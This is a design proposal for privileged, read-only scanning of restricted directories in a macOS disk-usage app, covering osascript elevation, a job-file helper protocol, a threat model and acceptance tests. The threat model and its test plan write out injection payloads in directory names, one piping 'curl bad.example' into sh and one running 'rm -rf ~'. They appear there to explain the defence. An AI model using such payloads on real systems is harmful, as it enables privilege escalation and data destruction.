# R3 — Administrator (privileged) scanning: design

Date: 2026-11-02 · Author: increment-designer · Status: proposed (not implemented)

**High-risk area, named in the first paragraph as required:** this increment touches
**restricted-space reporting** — the `NodeKind::Restricted` path in
`crates/core/src/scan.rs` (`Builder::walk_dir`, the `fs::read_dir` error arm) and the
`partial` flag it sets. It does **not** touch physical-size accounting (the elevated walk
reuses `scan::allocation`, `st_blocks * 512`, unchanged) and does **not** modify the
deletion guard (it adds a test to it). Deletion stays unprivileged; the privileged side
never receives a path from the UI.

**Fork resolution: prompt-per-scan (`osascript`), not the signed helper.** The signed
helper is unavailable today — this repo has no signing identity at all
(`apps/desktop/src-tauri/tauri.conf.json` has no signing config, the app bundles
unsigned) — and `SMAppService` cannot register a launchd daemon from an ad-hoc-signed or
unsigned helper on macOS 13+. The design below therefore ships the prompt-per-scan model,
but wraps it in a **runner-agnostic protocol** (a one-shot helper binary driven by a job
file, writing results to a file) so that swapping the `osascript` launcher for an
SMAppService/XPC launcher later changes exactly one module and zero protocol.

---

## 1. Root cause: what a purple petal actually is

When `Builder::walk_dir` cannot `read_dir` a directory, it returns a `NodeKind::Restricted`
node carrying the error string in `note`, sets `partial = true` on itself and every
ancestor, and increments `Tree::errors`. On macOS two different platform mechanisms
produce that outcome, and they behave differently under elevation:

1. **POSIX permissions** — mode bits and file ownership: other users' homes
   (`/Users/<other>`), most of `/Library`, `/private/var/db`, `/private/var/vm`. **Root
   bypasses these.** This is what R3 can genuinely fix.
2. **TCC (privacy)** — locations an app may not read without Full Disk Access:
   `~/Library/Mail`, `~/Library/Messages`, Safari data, and friends. **Root does not
   bypass TCC.** TCC is enforced against the *responsible process*, not the uid; an
   elevated child that is not covered by an FDA grant keeps getting EPERM there.

The walker sees both as an errno (`EACCES`/`EPERM`) and cannot classify them today. This
design therefore claims only class 1, and reports class 2 honestly: after an
administrator pass, whatever is still unreadable stays `Restricted` and the UI says how
many areas remain unmeasured. An FDA hint UI (Settings → Privacy → Full Disk Access) is
deferred to R5, where "hidden space" is already scoped.

## 2. The fork, reasoned from evidence

| | 1. Prompt-per-scan (`osascript`) | 2. Signed helper (`SMAppService` + XPC) |
|---|---|---|
| Ships today? | Yes — unsigned apps can raise the admin dialog via `do shell script … with administrator privileges` | No. Requires a Developer ID Application certificate, notarisation of app + helper, and CI release engineering. None exists in this repo. |
| User cost | One OS auth prompt **per elevated pass** (password, or Touch ID where the account allows it). All restricted paths are batched into one job, so it is one prompt per scan, not per directory. | One admin approval at install; silent afterwards. |
| Attack surface while idle | Zero — no resident privileged process exists between passes. | A root daemon listening on XPC, forever. Requires auditing the listener, the code-signing requirement, the install/uninstall lifecycle. |
| Prompt ownership | The dialog belongs to the OS; the app never sees the password. Attribution in the dialog names `osascript`, not DiskGuardian (cosmetic wart). | Dialog names the app. Product-grade appearance. |
| Sandbox compatibility | Incompatible with App Sandbox. Irrelevant: this is a direct-download app and `tauri.conf.json` has no sandbox entitlements. | Required for App Store distribution. |
| Later migration | The protocol below is launcher-independent; an SMAppService daemon can exec the same helper binary on the same job file. | — |

**Recommendation: option 1 now, with the protocol designed so option 2 is a module swap
later.** The one real cost is the prompt per pass; that is the honest price of having no
signing identity, and it is a price the user pays in exchange for zero standing root
surface. When the project acquires a Developer ID, the follow-up increment replaces the
runner in `apps/desktop/src-tauri/src/admin.rs` and nothing else changes.

## 3. The mechanism

### 3.1 New process: `diskguardian-admin` (one-shot helper binary)

New workspace member `crates/admin`, producing one binary `diskguardian-admin`. It links
`diskguardian-core` and `serde_json` only. It has **no** Tauri dependency (so `crates/core`
stays UI-free; the helper is a sibling, not a dependent of the app). Its entire capability
list:

- read a job file (path given as its only argument),
- walk the listed paths **read-only** via `diskguardian_core::scan` (stat/readdir only),
- write one JSON line per completed path plus a status file into the job's directory,
- exit.

It performs no other syscall class: no network, no writes outside the job directory, no
deletion — the helper source contains no call into `core::delete` at all, and that is a
review gate, not just a convention (see §5). It runs correctly unprivileged too (it will
simply report `Restricted` for what it cannot read), which is what makes the mechanism
testable without elevation.

**Job file** (written by the app, see §3.3), JSON, `deny_unknown_fields`:

```json
{ "version": 1, "deadline_secs": 900, "paths": ["/Library", "/private/var/db", "/Users/<other>"] }
```

**Results file** `results.jsonl` in the same directory — one object per completed path,
appended as each path finishes:

```json
{ "version": 1, "path": "/Library", "status": "ok", "tree": { …the serialized core Tree… } }
```

`status` is `"ok"` (tree measured), `"restricted"` (still unreadable even elevated — the
TCC case; `tree` is then the single Restricted node), or `"deadline"` (ran out of time;
`tree` holds what was measured, with the unwalked remainder as Restricted nodes).

**Status file** `status.json` at exit: `{ "version": 1, "exit": 0, "completed": 6,
"deadline_hit": false }`. The helper sets `results.jsonl` and `status.json` to mode 0644
explicitly — it runs as root and the unprivileged app must be able to read them.

**Deadline:** the helper enforces `deadline_secs` itself, because the app cannot reliably
kill a root child. This lands as a small core change: `ScanOptions` grows
`deadline: Option<Instant>`, checked at the top of `Builder::walk_dir`; past the deadline
a directory is returned as `NodeKind::Restricted` with note `"deadline reached"`, exactly
the existing unmeasured-is-reported shape (invariant A3). Precedent: the existing
`max_entries` cap (`Builder::claim_entry`) is the same kind of budget.

**Path validation in the helper:** every job path must be absolute, contain no `..`
component, and exist (`symlink_metadata`); unknown `version` or any unknown field aborts
with a distinct exit code before anything is walked. A path that vanishes mid-walk simply
becomes a `Restricted` node via the existing error arm.

### 3.2 Core changes (three small additions, `crates/core`)

1. `ScanOptions::deadline` (above), with a test: a deadline in the past makes the walk
   return Restricted nodes and `partial = true`, never a panic and never silent zero.
2. `Tree::graft(&mut self, id: NodeId, subtree: &Tree) -> Result<(), GraftError>` in
   `crates/core/src/model.rs`. Semantics: `subtree.scanned_root` must equal
   `self.path_of(id)` **as strings, no canonicalisation** (both strings are produced by us;
   canonicalising here would re-import the `/var` vs `/private/var` mismatch that bit C17).
   On match: the node at `id` takes the subtree root's `kind`, `own_bytes`, `file_count`,
   `note`, and its children are spliced in with all indices offset by `nodes.len()`;
   ancestor totals are recomputed with the existing private `recompute_from`; ancestor
   `partial` flags are recomputed by OR-ing children (a new private mirror of
   `recompute_from`, because `partial` currently only ever gets set, never cleared).
3. `Tree::restricted_roots(&self) -> Vec<NodeId>` — the **topmost** Restricted nodes
   (Restricted nodes with no Restricted ancestor; descendants of a Restricted node are
   invisible and must not be requested twice).

`Tree`/`Node` already derive `Serialize + Deserialize`
(`crates/core/src/model.rs`), which is what makes the process boundary free: the helper
emits the same type the app holds, no second schema exists anywhere.

Known accuracy limit, stated rather than hidden: hard-link dedup
(`Builder::claim_inode`, keyed `(dev, ino)`) is **per walk**. A file hard-linked once
under a readable directory and once under a restricted one counts twice after a graft.
C3's probe is single-walk and stays true; the ISA gets a note, not a weakening (§7).

### 3.3 App side: one command, `scan_restricted(scan_id)`

New module `apps/desktop/src-tauri/src/admin.rs` — following the per-OS adapter pattern of
`platform.rs`: macOS implements the runner, every other OS returns
`Err("administrator measurement is macOS-only for now")`.

Flow inside `#[tauri::command] pub async fn scan_restricted(scan_id)`:

1. Look up the scan; find `restricted_roots()`; if empty, return an error saying there is
   nothing to measure. **The webview supplies a `scan_id` and nothing else.**
2. Create a fresh directory under `$TMPDIR` (`tempfile`), mode 0700 by construction,
   write `job.json` (0600) with `path_of(id)` for each restricted root, one fixed
   `deadline_secs`.
3. Resolve the helper binary: `$DISKGUARDIAN_ADMIN_BIN` override →
   `std::env::current_exe()`'s sibling `diskguardian-admin` → error naming both places it
   looked.
4. Run the runner (macOS: `osascript`, below) on a `spawn_blocking` thread, so A4 (UI
   never blocks) holds exactly as it does for `scan`.
5. A reader thread polls `results.jsonl`; each completed line whose `path` matches an
   expected path is deserialized and **verified** (`scanned_root == path_of(id)`) before
   `Tree::graft`; status-line progress only ("3 of 7 areas measured") — no petal
   animation in this slice.
6. When the process exits, return `AdminScanReport { patched, still_restricted, bytes,
   files, view }` — a fresh `build_view`, the same projection every other command
   returns.

**The `osascript` invocation.** The AppleScript source is a fixed template with exactly
two interpolations, both app-generated paths:

```
do shell script "<helper> --job <jobfile>" with administrator privileges
```

Both `<helper>` and `<jobfile>` are our own strings (current_exe sibling; a
`tempfile`-generated path). They are additionally asserted to match
`^[A-Za-z0-9._/ -]+$` and refused otherwise — belt and braces on top of correct
AppleScript escaping. **The central security property: no disk-derived string (directory
names, scan paths) ever reaches the AppleScript source, the child's argv, or any shell.**
They live only inside the JSON job file. §5 shows why this is the difference between this
design and a privilege-escalation hole.

**Refusal:** the user cancels the OS dialog → `osascript` exits non-zero (AppleScript
error −128); the command maps any non-zero exit to a typed error (`refused` when stderr
identifies a cancel, `helper_failed(msg)` otherwise). The UI shows "Administrator access
was declined — restricted areas stay unmeasured" and the unprivileged tree is untouched.
No retry loop, no credential memory.

**Timeout:** two layers — the helper's own deadline produces a partial-but-valid result
(A3-compliant), and a hard outer wait in the app (deadline_secs + 120 s) after which the
command fails and the tree is left ungrafted. A hung dialog is user-paced and waits
indefinitely, like any modal.

### 3.4 Frontend

- `bridge.ts` / `types.ts`: `scanRestricted(scanId)` → `AdminScanReport`; the browser
  demo mode returns a canned report, following the existing demo pattern.
- `main.ts`: after a scan whose `result.partial` is true (and on macOS, detected from the
  user agent for now — a proper platform command is deferred), the status line gains a
  "Measure restricted areas…" action. On success the view is swapped for
  `report.view` and the status reads "Measured as administrator · recovered X · Y areas
  still restricted". On refusal, the status explains; nothing else changes.
- No change to the serialized shape of `ScanResponse` or `ViewNode`. Old frontend + new
  backend: the new command is simply never called. New frontend + old backend: the
  existing `showError` banner reports the unknown command. This deliberately stays out of
  the high-risk "old reader, new tree" class.

## 4. Minimal first slice, and the DEFERS list

**Slice (the smallest thing that puts real numbers on purple petals):**

1. Core: `deadline`, `graft`, `restricted_roots` + their tests (§8 AC1, and the guard
   test in §5).
2. `crates/admin`: the helper binary + its job-validation tests.
3. App: `admin.rs` runner, `scan_restricted` command, registration in `lib.rs`'s
   invoke handler.
4. Frontend: bridge/types/status affordance.
5. Verification: `bun run tauri:build` and confirm `diskguardian-admin` is present in
   `DiskGuardian.app/Contents/MacOS/` (bundle wiring via Tauri `externalBin`), plus the
   one manual elevated run (AC4).
6. README: an "Administrator measurement" section with the privacy statement (the dialog
   is Apple's; the app never sees the password; the helper measures and never deletes).

**DEFERS (explicitly not in this increment):**

- Linux (`pkexec` runner: same helper, same job/result files, polkit provides the prompt)
  and Windows (UAC elevation needs its own runner design). The core graft/deadline work
  is platform-neutral and both would reuse all of it; this slice ships macOS only because
  that is the only platform the product ships on at all today.
- SMAppService/XPC launcher (blocked on a Developer ID + notarisation; protocol is ready).
- Incremental petal growth during the admin pass (status-line progress only for now).
- Cross-walk hard-link dedup (stated limitation, §3.2).
- TCC/FDA detection and the "grant Full Disk Access" hint (R5 territory).
- Any policy for capping the number of job paths (in practice the topmost-restricted set
  is tens, not thousands; revisit only if a measurement says otherwise).
- Authorization caching of any kind. One prompt per pass, by design.

## 5. Threat model

**Assets:** root (the helper runs as root while a pass is live); the integrity of the
displayed numbers; the deletion boundary (A1).

**T1 — argument injection into the shelled command.** The naive shape of this feature —
interpolating the paths to scan into the `do shell script` string — is a privilege
escalation: any process that can create a directory on the user's disk (an unpacked
archive, another local user) plants
`Downloads/evil"; do shell script "curl bad.example | sh"; echo "`, the user scans
Downloads, clicks "measure restricted", approves the OS dialog, and root executes the
planted string. This design removes the class structurally: disk-derived strings never
appear in the AppleScript source or the child argv — only two app-generated, charset-
asserted paths do; everything else travels as JSON in the job file, and the helper itself
never invokes a shell. Probe: a unit test builds jobs containing hostile names
(`x"; rm -rf ~; echo "`, backticks, `$()`, newlines, quotes) and asserts the AppleScript
source and child argv are byte-identical to the fixed template, and that the job JSON
round-trips the names unchanged.

**T2 — TOCTOU between measure and delete.** The privileged process measures; deletion
happens in the unprivileged app via the existing `delete_collected` → `core::delete`
path, as the user, behind the unchanged guard. A root-measured item the user cannot
delete fails per-item and is reported as failed — the outcome display already handles
this. The reverse concern (a path swapped on disk between measurement and deletion) is a
pre-existing property, unchanged here: `guard` canonicalises, `remove` stats with
`symlink_metadata` and a symlink is removed as a link, never followed. What is *new* is
that an elevated scan makes protected trees *visible*; visibility is not deletability —
new test: build a tree grafted with a subtree under `/System`-class paths and assert
`delete::guard` still refuses them (the guard is path-based and untouched, but this pins
it against exactly the regression an elevated scan invites).

**T3 — the helper is asked to walk an unexpected path.** Job validation (§3.1): absolute,
no `..`, exists, known version, no unknown fields, else exit before walking. Walking any
absolute path is not a compromise — the helper is read-only; the worst a tampered job can
do is make root *measure* something and write numbers into a 0700 directory. The job file
itself cannot be swapped by another local user: it sits in a 0700 per-user `$TMPDIR`
subdirectory the app created. Results tampering is an integrity concern, not a security
one, and is blunted anyway: the app verifies each line's `scanned_root` against
`path_of(id)` before grafting.

**T4 — webview compromise.** An attacker who owns the webview can call `invoke` on any
command. Against `scan_restricted` the worst cases are: repeated OS auth prompts
(annoyance, no elevation happens without the human at the keyboard), and reading tree
data it can already read via `view`. It cannot hand the privileged side a path (the
command takes none), cannot delete elevated (no such code path exists anywhere), and
cannot reach the helper binary directly (it is not a Tauri command). This is why the
command is `scan_restricted(scan_id)` and not `scan_restricted(paths)`.

**T5 — binary substitution.** In a real install the helper is resolved only inside the
app bundle (`/Applications/…/Contents/MacOS/`), which non-admin writers cannot replace;
in dev it is found in the build tree or via env override, where the "attacker" with write
access is already the user who owns the machine and types the admin password. Noted, not
mitigated further in this slice.

**What an attacker who fully controls this path gains:** wrong numbers in a UI. The
helper has no mutation capability beyond writing two files in one 0700 directory, and the
review gate for the helper crate is: *no call sites into `core::delete`, no shell, no
network — the capability list of §3.1 is the whole source.*

## 6. Surfaces that must move

| Surface | Change |
|---|---|
| Core public API (`crates/core/src/lib.rs`) | re-export `GraftError`; `ScanOptions::deadline`; `Tree::graft`; `Tree::restricted_roots` |
| Serialized shape across IPC | **unchanged** for `Tree`/`Node`/`ViewNode`/`ScanResponse`; new additive `AdminScanReport` |
| Command surface (`apps/desktop/src-tauri/src/`) | new `admin.rs`, new command `scan_restricted`, `lib.rs` registration, `Cargo.toml` workspace member `crates/admin` |
| TypeScript (`apps/desktop/src/`) | `bridge.ts`, `types.ts`, `main.ts` status affordance |
| Docs | README "Administrator measurement" + privacy note |
| ISA | amendments in §7 (maintainer lands these) |

## 7. Claim and anti-claim impact

- **A1 (deletes only what the user collected): unaffected.** Deletion code path untouched;
  helper has no delete capability; new guard test pins protected paths inside grafted
  trees (§5 T2).
- **A2 (allocation, never logical): unaffected.** The elevated walk is the same walker;
  root changes privilege, not arithmetic.
- **A3 (unmeasured reported, never dropped): strengthened.** The deadline path creates a
  second, tested producer of Restricted nodes; the TCC case produces a third (`status:
  "restricted"` results counted as `still_restricted`).
- **A4 (UI never blocks): preserved by construction** — the runner runs on
  `spawn_blocking`, identical to `scan`.
- **A5 (core loop never requires elevation): preserved.** The unprivileged scan is
  unchanged and complete; the admin pass is optional, additive, and per-invocation.
  Proposed note under A5: *"elevation is an optional measurement pass; scanning,
  navigating and deleting all work unprivileged."*
- **C3 (hard links counted once): scope note added** — dedup is per-walk; a hard link
  spanning a user-walked and an admin-walked subtree counts twice. Falsifier unchanged
  (single-walk fixture).
- **C4/C5: extended** — graft must preserve "restricted visible" and tree arithmetic;
  new tests under the same `assert_tree_arithmetic` harness.
- **Out of Scope (v0.1):** the line "Admin / root scanning. Core loop must work with user
  privileges only." is amended to keep the second sentence and drop the first — the core
  loop still works with user privileges only.

**New claim, exact text proposed for ISA.md § Claims:**

> ### C22 — Restricted space can be measured with administrator consent
> A scan that produced `Restricted` nodes offers an administrator measurement pass. One OS
> auth dialog per pass (all restricted roots batched); after it, previously restricted
> petals carry real allocated sizes, tree arithmetic still holds, ancestors' `partial`
> flags clear where nothing restricted remains, and anything still unreadable stays
> `Restricted` with a count. The privileged side performs measurement only and never
> receives a path from the UI.
> **Falsifier:** a grafted tree whose arithmetic breaks; a restricted node that becomes
> measured without any elevation having occurred; any code path where the webview's
> arguments reach the privileged process.
> **Probe:** `cargo test -p diskguardian-core` (`graft_*`, `deadline_*`,
> `deletion_guard_refuses_protected_locations` extended), `src-tauri/tests/ipc.rs`
> (mock-runner `scan_restricted`, injection invariance), plus the manual AC4 run.

**New § Decisions entries proposed:**

1. *Prompt-per-scan elevation, not a signed helper* (2026-11-02) — no signing identity
   exists in-repo; `SMAppService` cannot register unsigned/ad-hoc helpers; a per-pass
   prompt buys zero standing root surface. Runner is swappable for SMAppService later.
2. *Job-file/results-file protocol* — the helper is a one-shot, file-driven, read-only
   scanner; disk-derived strings never reach any shell or argv (kills the T1 class).
3. *Measurement only, ever* — the privileged process deletes nothing and accepts no path
   from the UI; deletion stays unprivileged and guarded (A1).
4. *One prompt per pass* — all topmost restricted roots batched into a single job; no
   authorization caching.

## 8. Measurable acceptance criteria

Each criterion names its probe; "it works" is not a criterion.

| # | Criterion | Probe | Falsifier |
|---|---|---|---|
| AC1 | Graft preserves arithmetic and clears/reports partial correctly | `cargo test -p diskguardian-core`: fixture A has a mode-000 `locked/` (8 MiB in 64 KiB files); a readable *twin* of the same construction is scanned separately; graft the twin's tree at A's `locked` node; assert kind flips to Directory, root total grows by the twin's total ± 4 KiB, `assert_tree_arithmetic` passes over the whole grafted tree, ancestor `partial` clears when no Restricted remains and stays set when a sibling is still Restricted | any arithmetic violation, delta outside tolerance, or a stuck `partial` |
| AC2 | The helper as root reports `du`-grade numbers on POSIX-denied trees; without root it reports nothing (RED control) | test script (gated on `sudo -n` availability, skipped otherwise, mirroring the existing skip-as-root guard in `crates/core/tests/scan.rs`): run `diskguardian-admin` on the mode-000 fixture; compare its subtree total to `sudo du -sk` × 1024 within 1%; then run the identical pipeline *unprivileged* and assert recovered bytes are 0 and the node stays Restricted | helper/root total differs from `du` by >1%; or the unprivileged control "recovers" anything (which would mean the effect is not elevation but a re-walk artifact) |
| AC3 | The IPC surface is safe and typed | `src-tauri/tests/ipc.rs` on the mock runtime with an injected fake runner: `scan_restricted` grafts a canned result and returns a pruned view; unknown `scan_id` errors; non-zero runner exit maps to the typed refusal message; hostile-name job construction leaves the AppleScript source and argv byte-identical to the fixed template | any disk-derived string appearing in the AppleScript/argv assertion, or a refusal surfacing as a generic crash |
| AC4 | The real thing, once, by a human | manual run recorded in the ISA log: built `.app`, scan a real disk, click the affordance, approve the OS dialog once; screenshot of purple petals resolving; before/after totals as byte counts only (no real paths in any record) | petals do not resolve, the app hangs, or more than one prompt appears for the pass |

**Pre-committed acceptance rule (written before any number is looked at).** Metric: bytes
recovered = (grafted tree total) − (pre-pass tree total) on AC1's synthetic fixture
(exact, tolerance above), and on one real developer machine, the sum of Restricted-root
bytes that flip to measured across a startup-disk scan. Sample size: the synthetic
fixture plus one real disk (a second disk only if the first lands in the inconclusive
band). Both kill directions:

- **Ships** if AC1–AC3 pass and the real-machine recovery is ≥ 1 GB (the roadmap's
  premise is "tens of GB hide there"; 1 GB is the floor at which the feature earns its
  prompt).
- **Killed / deprioritised** if AC1–AC3 pass but real-machine recovery is < 100 MB: the
  premise is false on real disks and R3 should yield to R4 (snapshots) and R5 (hidden
  space).
- **Underpowered, not conclusive**, if recovery lands in 100 MB–1 GB: one atypical disk
  cannot decide "R3 worthless" vs "this disk is clean"; measure a second volume before
  any verdict. No tuning of thresholds after seeing data.
- Any AC1–AC3 failure blocks regardless of recovered bytes — a mechanism that corrupts
  arithmetic is worse than purple petals.

## 9. Top risks, each with what would falsify the design

1. **`osascript` behaviour at scale** (hang, or AppleScript result-size limits). Mitigated
   by keeping the child's stdout empty and shipping results via file. Falsified by AC4
   hanging or truncating; the fallback is a `launchctl asuser`-style runner, same
   protocol.
2. **TCC petals stay purple and users read that as failure.** Mitigated by naming the
   remaining count. Falsified by AC4 if the remaining-restricted share is large on a
   typical disk — that would promote the FDA hint from R5 into R3's follow-up.
3. **Unsigned-app friction on current macOS** (Gatekeeper/AppleScript approval prompts
   stacking). Falsified only by AC4 on the target OS version; if it bites, the answer is
   signing, i.e. option 2, not a workaround.
4. **Graft index/partial bugs corrupt accounting** — the highest-risk code of the
   increment. Falsified by AC1's `assert_tree_arithmetic` over the grafted tree; the test
   exists specifically because this is where a silent lie would live.
5. **Helper missing from the bundle** → runtime resolution failure. Falsified by the
   slice's explicit post-build check of `Contents/MacOS/`.
6. **Elevated walks of large system trees take minutes** with only status-line progress.
   Falsified as unacceptable by AC4 wall-clock; the deferred incremental-graft animation
   would then be promoted.

## 10. What I would refuse to build

- **Elevated deletion of any kind.** "Clean system files as root" converts every future
  webview bug into a root compromise. The helper measures; that is its whole job.
- **A resident privileged daemon before a signing identity exists.** SMAppService with an
  unsigned/ad-hoc helper fails at install on macOS 13+; shipping a broken installer is
  worse than a prompt. Blocked, not abandoned (§2).
- **Any capture or caching of the administrator credential** by the app, and any sudoers
  entry arranged for it. The password belongs to the OS dialog; the session ends when the
  child exits.
- **A command that passes webview-supplied paths to the privileged side**, including "just
  this once" rescans of arbitrary strings. `scan_restricted` takes a `scan_id`; the
  privileged path list is derived server-side from the stored tree.

## 11. Precedent

- **`NodeKind::Restricted` path** (`crates/core/src/scan.rs`, pinned by
  `unreadable_directory_is_reported_not_dropped`): the admin pass is a new *producer* and
  *resolver* of exactly that node kind; the deadline reuses its shape.
- **`ScanOptions::max_entries` / `Builder::claim_entry`**: `deadline` follows the same
  budget-in-options pattern with the same partial-flagging consequence.
- **Trash-by-default + narrow guard** (`crates/core/src/delete.rs`): "the privileged side
  measures, the user side deletes" extends the same conservatism.
- **`platform.rs` per-OS adapters**: `admin.rs` is the same shape — a thin, honest,
  per-platform runner that degrades to a clear error elsewhere.
- **Mock-runtime IPC tests** (`apps/desktop/src-tauri/tests/ipc.rs`, landed for C18):
  AC3's fake-runner tests extend exactly this harness.

## 12. Open questions for the maintainer

1. Prompt cadence: this design prompts once per elevated pass and caches nothing. If that
   feels heavy in practice, the alternative is a "remember for this app session" — which
   means a resident helper, which means option 2. Decision needed only after AC4 feels
   real.
2. Developer ID acquisition: if R3 proves out (≥1 GB recovered), the signing path becomes
   the product-grade follow-up. Is the Apple Developer Program ($99/yr) in scope for this
   project?
3. Naming: `diskguardian-admin` for the helper binary, `crates/admin` for the crate —
   trivial, but it lands in the bundle, so it is cheap to fix now and annoying later.
4. The ISA amendments of §7 are drafted verbatim for landing; the Out-of-Scope line and
   A5 note are judgment calls that belong to you, not to this design.
